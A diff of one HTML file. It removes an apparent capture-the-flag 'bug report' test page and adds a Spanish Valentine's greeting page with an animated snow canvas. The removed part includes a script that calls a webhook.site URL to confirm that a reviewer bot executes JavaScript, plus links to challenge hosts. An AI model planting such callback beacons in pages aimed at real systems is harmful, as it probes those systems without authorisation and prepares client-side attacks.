@@ -1,48 +1,260 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="es">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Bug Report Test Page</title>
-
-  <script>
-    // Señal visible si alguien abre la página (incluye el bot)
-    document.title = "UTOPIA REVIEWER ACTIVE";
-  </script>
-
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>San Valentín</title>
   <style>
-    body { font-family: Arial, sans-serif; padding: 24px; line-height: 1.4; }
-    code { background: #f2f2f2; padding: 2px 6px; border-radius: 6px; }
-    .ok { margin-top: 12px; padding: 10px 12px; border: 1px solid #ddd; border-radius: 10px; }
+    :root{
+      --sky-top: #0b1026;
+      --sky-mid: #1a2453;
+      --sky-low: #ff7a6a;
+      --text: rgba(255,255,255,0.95);
+      --glow: rgba(255,255,255,0.35);
+    }
+
+    html, body {
+      height: 100%;
+      margin: 0;
+      overflow: hidden;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji","Segoe UI Emoji";
+      background: #000;
+    }
+
+    /* Cielo (anochecer) */
+    .scene {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      background:
+        radial-gradient(1200px 800px at 70% 20%, rgba(255,255,255,0.08), transparent 60%),
+        radial-gradient(900px 700px at 20% 30%, rgba(120,170,255,0.12), transparent 55%),
+        linear-gradient(to bottom, var(--sky-top) 0%, var(--sky-mid) 55%, var(--sky-low) 110%);
+    }
+
+    /* Estrellas suaves */
+    .stars::before,
+    .stars::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background-repeat: repeat;
+      background-size: 260px 260px;
+      opacity: 0.55;
+      mix-blend-mode: screen;
+      filter: blur(0.2px);
+      pointer-events: none;
+    }
+    .stars::before{
+      background-image:
+        radial-gradient(2px 2px at 20px 30px, rgba(255,255,255,0.9), transparent 60%),
+        radial-gradient(1px 1px at 120px 90px, rgba(255,255,255,0.7), transparent 60%),
+        radial-gradient(1px 1px at 200px 40px, rgba(255,255,255,0.6), transparent 60%),
+        radial-gradient(2px 2px at 80px 180px, rgba(255,255,255,0.8), transparent 60%),
+        radial-gradient(1px 1px at 220px 210px, rgba(255,255,255,0.6), transparent 60%);
+      animation: drift 40s linear infinite;
+    }
+    .stars::after{
+      background-image:
+        radial-gradient(1px 1px at 30px 140px, rgba(255,255,255,0.6), transparent 60%),
+        radial-gradient(2px 2px at 160px 170px, rgba(255,255,255,0.85), transparent 60%),
+        radial-gradient(1px 1px at 240px 120px, rgba(255,255,255,0.6), transparent 60%),
+        radial-gradient(1px 1px at 60px 60px, rgba(255,255,255,0.7), transparent 60%),
+        radial-gradient(2px 2px at 190px 230px, rgba(255,255,255,0.8), transparent 60%);
+      opacity: 0.35;
+      animation: drift 70s linear infinite reverse;
+    }
+
+    @keyframes drift {
+      from { transform: translate3d(0,0,0); }
+      to { transform: translate3d(-260px, 260px, 0); }
+    }
+
+    /* Luna */
+    .moon {
+      position: absolute;
+      width: 160px;
+      height: 160px;
+      top: 8vh;
+      left: 10vw;
+      border-radius: 50%;
+      background: radial-gradient(circle at 35% 35%, rgba(255,255,255,1), rgba(245,245,255,0.9) 55%, rgba(210,215,255,0.75) 100%);
+      box-shadow:
+        0 0 40px 12px rgba(255,255,255,0.18),
+        0 0 120px 40px rgba(120,170,255,0.10);
+      filter: saturate(1.05);
+      pointer-events: none;
+    }
+    /* “cráteres” sutiles */
+    .moon::before{
+      content:"";
+      position:absolute;
+      inset: 0;
+      border-radius: 50%;
+      background:
+        radial-gradient(14px 14px at 35% 55%, rgba(180,190,220,0.25), transparent 60%),
+        radial-gradient(10px 10px at 60% 40%, rgba(160,170,210,0.20), transparent 60%),
+        radial-gradient(18px 18px at 55% 70%, rgba(150,160,210,0.18), transparent 60%),
+        radial-gradient(9px 9px at 30% 30%, rgba(160,170,210,0.18), transparent 60%);
+      mix-blend-mode: multiply;
+    }
+
+    /* Bruma del horizonte */
+    .haze {
+      position: absolute;
+      left: 0;
+      right: 0;
+      bottom: -10vh;
+      height: 45vh;
+      background: radial-gradient(1200px 300px at 50% 10%, rgba(255,170,150,0.25), transparent 70%),
+                  linear-gradient(to top, rgba(10,15,35,0.90), rgba(10,15,35,0.0));
+      pointer-events: none;
+    }
+
+    /* Texto centrado */
+    .message {
+      position: absolute;
+      inset: 0;
+      display: grid;
+      place-items: center;
+      text-align: center;
+      padding: 24px;
+      pointer-events: none;
+    }
+    .card {
+      max-width: 900px;
+      padding: 22px 26px;
+      border-radius: 18px;
+      background: rgba(0,0,0,0.22);
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
+      border: 1px solid rgba(255,255,255,0.18);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+    }
+    .card h1{
+      margin: 0;
+      font-weight: 700;
+      letter-spacing: 0.2px;
+      color: var(--text);
+      text-shadow: 0 0 18px var(--glow);
+      font-size: clamp(22px, 3.2vw, 44px);
+      line-height: 1.2;
+    }
+    .card p{
+      margin: 10px 0 0;
+      color: rgba(255,255,255,0.82);
+      font-size: clamp(13px, 1.3vw, 16px);
+    }
+
+    /* Canvas de nieve */
+    canvas#snow {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+    }
+
+    /* Pequeña firma abajo (opcional) */
+    .footer {
+      position: absolute;
+      left: 0;
+      right: 0;
+      bottom: 14px;
+      text-align: center;
+      font-size: 12px;
+      color: rgba(255,255,255,0.55);
+      pointer-events: none;
+      text-shadow: 0 0 10px rgba(0,0,0,0.35);
+    }
   </style>
 </head>
-
 <body>
-  <h1>Bug Report Test Page</h1>
-  <p>
-    If you see this, the page is being rendered by the reviewer.
-  </p>
+  <div class="scene stars" id="scene">
+    <div class="moon" aria-hidden="true"></div>
+    <canvas id="snow"></canvas>
 
-  <div class="ok">
-    <p><b>Status:</b> Page loaded.</p>
-    <p><b>Timestamp:</b> <code id="ts"></code></p>
+    <div class="message">
+      <div class="card">
+        <h1>Feliz San Valentin Ale, que tengas un lindo día</h1>
+        <p>❄️ Con cariño, en un anochecer con luna y nieve.</p>
+      </div>
+    </div>
+
+    <div class="haze" aria-hidden="true"></div>
+    <div class="footer" aria-hidden="true">✨</div>
   </div>
 
-  <h2>Useful links</h2>
-  <ul>
-    <li><a href="https://9f7f18303cdb2d4f.chal.ctf.ae/" target="_blank" rel="noopener">Utopia Portal</a></li>
-    <li><a href="https://9f7f18303cdb2d4f.chal.ctf.ae/services/utoid" target="_blank" rel="noopener">UtoID Service</a></li>
-  </ul>
-
   <script>
-    // Timestamp para ver cambios en tu HTML rápidamente
-    document.getElementById("ts").textContent = new Date().toISOString();
+    // Nieve en canvas (ligera y fluida)
+    const canvas = document.getElementById("snow");
+    const ctx = canvas.getContext("2d");
 
-    // Confirmación silenciosa: si el bot ejecuta JS, verás esto en webhook.site
-    fetch("https://webhook.site/a4053a95-57cc-4688-a72d-9b4d9ec0672b?js=executed&ts=" + encodeURIComponent(new Date().toISOString()))
-      .catch(() => {});
+    let w, h, dpr;
+    function resize() {
+      dpr = Math.max(1, Math.min(2, window.devicePixelRatio || 1));
+      w = Math.floor(window.innerWidth);
+      h = Math.floor(window.innerHeight);
+      canvas.width = Math.floor(w * dpr);
+      canvas.height = Math.floor(h * dpr);
+      canvas.style.width = w + "px";
+      canvas.style.height = h + "px";
+      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+    }
+    window.addEventListener("resize", resize);
+    resize();
 
-    console.log("Bug report page loaded");
+    const rand = (min, max) => Math.random() * (max - min) + min;
+
+    const flakes = [];
+    const FLAKE_COUNT = Math.floor(Math.min(220, Math.max(90, w / 6)));
+
+    function makeFlake() {
+      const size = rand(1.2, 4.2);
+      return {
+        x: rand(0, w),
+        y: rand(-h, 0),
+        r: size,
+        vx: rand(-0.35, 0.35),
+        vy: rand(0.6, 2.2) * (size / 3.2),
+        drift: rand(0, Math.PI * 2),
+        alpha: rand(0.35, 0.95),
+      };
+    }
+
+    for (let i = 0; i < FLAKE_COUNT; i++) flakes.push(makeFlake());
+
+    function draw() {
+      ctx.clearRect(0, 0, w, h);
+
+      // brillo suave de nieve
+      for (const f of flakes) {
+        ctx.beginPath();
+        ctx.globalAlpha = f.alpha;
+        ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2);
+        ctx.fillStyle = "white";
+        ctx.fill();
+      }
+      ctx.globalAlpha = 1;
+
+      // update
+      for (const f of flakes) {
+        f.drift += 0.01;
+        f.x += f.vx + Math.sin(f.drift) * 0.35;
+        f.y += f.vy;
+
+        // wrap
+        if (f.y > h + 10) {
+          f.y = rand(-60, -10);
+          f.x = rand(0, w);
+        }
+        if (f.x < -20) f.x = w + 20;
+        if (f.x > w + 20) f.x = -20;
+      }
+
+      requestAnimationFrame(draw);
+    }
+    draw();
   </script>
 </body>
 </html>
